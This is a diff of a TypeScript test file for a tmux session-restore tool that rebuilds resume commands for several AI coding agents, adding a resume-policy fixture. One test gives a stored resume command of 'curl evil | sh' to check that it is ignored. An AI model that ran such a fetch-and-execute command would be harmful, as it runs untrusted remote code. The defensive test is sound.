@@ -20,11 +20,11 @@ import { SpacesStore, type ResurrectSpaceSnapshot } from "../store/db";
 import {
   captureOpenState,
   captureSpaces,
-  discoverLiveSessionId,
   extractSessionIdFromArgs,
   harnessLaunchArgs,
   harnessProfileFromArgv,
   readChildCmdline,
+  type HarnessResumePolicy,
 } from "./capture";
 import {
   agentBinaryName,
@@ -38,6 +38,35 @@ import {
   SPACES_RESTORED_OPTION,
   type VendorSessionLookup,
 } from "./restore";
+
+/**
+ * Sample plugin policy fixture used in unit tests to verify the agent-agnostic
+ * `HarnessResumePolicy` seam without hardcoding agent rules in `resurrect/`.
+ */
+const TEST_RESUME_POLICY: HarnessResumePolicy = {
+  positionalResume: (agent) => agent === "codex" || agent === "muse",
+  uniqueExplicitSessions: (agent) => agent === "codex",
+  resumeArgs: (agent, sid) => {
+    switch (agent) {
+      case "claude":
+      case "cursor-agent":
+        return ["--resume", sid];
+      case "codex":
+      case "muse":
+        return ["resume", sid];
+      case "antigravity":
+        return ["--conversation", sid];
+      case "opencode":
+      case "kilo":
+      case "kimi":
+      case "kimi-cli":
+      case "deepseek":
+        return ["--session", sid];
+      default:
+        return [];
+    }
+  },
+};
 
 const tempDirs: string[] = [];
 
@@ -370,16 +399,15 @@ describe("extractSessionIdFromArgs & harness launchers", () => {
       extractSessionIdFromArgs("claude", ["claude", "--resume", "--session", "valid-id"]),
     ).toBe("valid-id");
 
-    // Positional `resume <id>` for codex & muse (plus aliases), skipping --last and -*
-    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "cx-1"])).toBe("cx-1");
-    expect(extractSessionIdFromArgs("openai-codex", ["codex", "resume", "cx-2"])).toBe("cx-2");
-    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "--last"])).toBe("");
-    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "-q"])).toBe("");
-    expect(extractSessionIdFromArgs("muse", ["muse", "resume", "mu-1"])).toBe("mu-1");
-    expect(extractSessionIdFromArgs("muse-cli", ["muse", "resume", "mu-2"])).toBe("mu-2");
+    // Positional `resume <id>` only when enabled by plugin policy, skipping --last and -*
+    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "cx-1"], true)).toBe("cx-1");
+    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "--last"], true)).toBe("");
+    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "-q"], true)).toBe("");
+    expect(extractSessionIdFromArgs("muse", ["muse", "resume", "mu-1"], true)).toBe("mu-1");
 
-    // Non-positional agents do NOT treat bare `resume <id>` as session ID
+    // Disabled by default (agent-agnostic)
     expect(extractSessionIdFromArgs("claude", ["claude", "resume", "not-a-flag"])).toBe("");
+    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "cx-1"])).toBe("");
   });
 
   test("harnessLaunchArgs & harnessProfileFromArgv recognize spaces, tmux-spaces, harness, __resume-access", () => {
@@ -464,33 +492,6 @@ describe("/proc inspection helpers", () => {
     addProc(300, [301], ["zsh"]);
     addProc(301, [], ["nvim", "main.ts"]);
     expect(readChildCmdline(300, procRoot)).toEqual(["nvim", "main.ts"]);
-  });
-
-  test("discoverLiveSessionId inspects /proc/<pid>/fd/* for Antigravity conversation DBs and presence locks", () => {
-    const procRoot = makeTempDir("mock-proc-agy-");
-
-    const addProcWithFds = (pid: number, children: number[], fdTargets: string[]) => {
-      const pDir = path.join(procRoot, String(pid));
-      mkdirSync(path.join(pDir, "task", String(pid)), { recursive: true });
-      mkdirSync(path.join(pDir, "fd"), { recursive: true });
-      writeFileSync(path.join(pDir, "task", String(pid), "children"), children.join(" "));
-      fdTargets.forEach((target, idx) => {
-        symlinkSync(target, path.join(pDir, "fd", String(idx + 3)));
-      });
-    };
-
-    // Parent has only presence lock; descendant has conversation DB -> conversation DB wins
-    addProcWithFds(400, [401], ["/home/u/.gemini/antigravity-cli/presence/lock-id.lock"]);
-    addProcWithFds(401, [], ["/home/u/.gemini/antigravity-cli/conversations/conv-db-9.db-wal"]);
-
-    expect(discoverLiveSessionId("antigravity", 400, procRoot)).toBe("conv-db-9");
-    expect(discoverLiveSessionId("agy", 400, procRoot)).toBe("conv-db-9");
-    expect(discoverLiveSessionId("claude", 400, procRoot)).toBe("");
-
-    // Fallback to presence lock when no conversation DB fd is open
-    addProcWithFds(500, [501], []);
-    addProcWithFds(501, [], ["/home/u/.gemini/antigravity-cli/presence/lock-only-1.lock"]);
-    expect(discoverLiveSessionId("antigravity", 500, procRoot)).toBe("lock-only-1");
   });
 });
 
@@ -806,22 +807,23 @@ describe("6-tier resume priority chain & captureSpaces", () => {
 });
 
 describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneCommand", () => {
-  test("maps binary names and native resume args across all built-in agents", () => {
+  test("maps binary names and delegates native resume args to HarnessResumePolicy", () => {
     expect(agentBinaryName("cursor")).toBe("cursor-agent");
     expect(agentBinaryName("claude-code")).toBe("claude");
     expect(agentBinaryName("agy")).toBe("antigravity");
 
-    expect(agentResumeArgs("claude", "s1")).toEqual(["--resume", "s1"]);
-    expect(agentResumeArgs("codex", "s1")).toEqual(["resume", "s1"]);
-    expect(agentResumeArgs("opencode", "s1")).toEqual(["--session", "s1"]);
-    expect(agentResumeArgs("kilo", "s1")).toEqual(["--session", "s1"]);
-    expect(agentResumeArgs("kimi", "s1")).toEqual(["--session", "s1"]);
-    expect(agentResumeArgs("kimi-cli", "s1")).toEqual(["--session", "s1"]);
-    expect(agentResumeArgs("cursor-agent", "s1")).toEqual(["--resume", "s1"]);
-    expect(agentResumeArgs("antigravity", "s1")).toEqual(["--conversation", "s1"]);
-    expect(agentResumeArgs("muse", "s1")).toEqual(["resume", "s1"]);
-    expect(agentResumeArgs("deepseek", "s1")).toEqual(["--session", "s1"]);
-    expect(agentResumeArgs("claude", "")).toEqual([]);
+    // Agent-agnostic by default when no HarnessResumePolicy is provided
+    expect(agentResumeArgs("claude", "s1")).toEqual([]);
+    expect(agentResumeArgs("codex", "s1")).toEqual([]);
+
+    expect(agentResumeArgs("claude", "s1", TEST_RESUME_POLICY)).toEqual(["--resume", "s1"]);
+    expect(agentResumeArgs("codex", "s1", TEST_RESUME_POLICY)).toEqual(["resume", "s1"]);
+    expect(agentResumeArgs("opencode", "s1", TEST_RESUME_POLICY)).toEqual(["--session", "s1"]);
+    expect(agentResumeArgs("antigravity", "s1", TEST_RESUME_POLICY)).toEqual([
+      "--conversation",
+      "s1",
+    ]);
+    expect(agentResumeArgs("claude", "", TEST_RESUME_POLICY)).toEqual([]);
   });
 
   test("resolveAgentSessions handles Tier 6 vendor store deduplication, skipResume, and Codex duplicate-pane shell fallback", () => {
@@ -874,7 +876,7 @@ describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneComm
       ],
     };
 
-    const res = resolveAgentSessions(snap, lookup);
+    const res = resolveAgentSessions(snap, lookup, TEST_RESUME_POLICY);
     expect(res.sessionIds).toEqual({
       "0:1": "claude-newest",
       "2:0": "agy-1",
@@ -954,6 +956,7 @@ describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneComm
         {
           selfPath: "/bin/tmux-spaces",
           verifiedResumeCmd: ["sh", "-c", "curl evil | sh"],
+          resumePolicy: TEST_RESUME_POLICY,
         },
       ),
     ).toEqual(["/bin/tmux-spaces", "__shim", "claude", "claude", "--resume", "s-42"]);
@@ -969,7 +972,7 @@ describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneComm
           session_id: "agy-1",
           full_command: ["/old/tmux-spaces", "__resume-access", "sandboxed", "agy", "profile", "saucerf166", "--conversation", "agy-1"],
         },
-        { selfPath: "/bin/tmux-spaces" },
+        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
       ),
     ).toEqual([
       "/bin/tmux-spaces",
@@ -990,7 +993,7 @@ describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneComm
     expect(
       buildPaneCommand(
         { index: 0, active: true, agent: "codex", profile: "codex-work", session_id: "c-9" },
-        { selfPath: "/bin/tmux-spaces" },
+        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
       ),
     ).toEqual([
       "/bin/tmux-spaces",
@@ -1017,7 +1020,7 @@ describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneComm
           session_id: "s-42",
           full_command: ["claude", "--dangerously-skip-permissions"],
         },
-        { selfPath: "/bin/tmux-spaces" },
+        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
       ),
     ).toEqual([
       "/bin/tmux-spaces",
@@ -1032,14 +1035,14 @@ describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneComm
     expect(
       buildPaneCommand(
         { index: 0, active: true, agent: "claude", session_id: "s-42" },
-        { selfPath: "/bin/tmux-spaces", skipResume: true },
+        { selfPath: "/bin/tmux-spaces", skipResume: true, resumePolicy: TEST_RESUME_POLICY },
       ),
     ).toEqual(["/bin/tmux-spaces", "__shim", "claude", "claude"]);
 
     expect(
       buildPaneCommand(
         { index: 0, active: true, agent: "cursor", session_id: "cur-1" },
-        { selfPath: "/bin/tmux-spaces" },
+        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
       ),
     ).toEqual([
       "/bin/tmux-spaces",
@@ -1127,6 +1130,7 @@ describe("resolveRestoreCwd & restoreSpace", () => {
     await restoreSpace(driver, snap, {
       selfPath: "/bin/tmux-spaces",
       switch: true,
+      resumePolicy: TEST_RESUME_POLICY,
       isDir: () => true,
     });
 
@@ -1208,6 +1212,7 @@ describe("resolveRestoreCwd & restoreSpace", () => {
     await restoreSpace(driver, loaded, {
       selfPath: "/bin/tmux-spaces",
       resolveSession: lookup,
+      resumePolicy: TEST_RESUME_POLICY,
       isDir: () => true,
     });
 
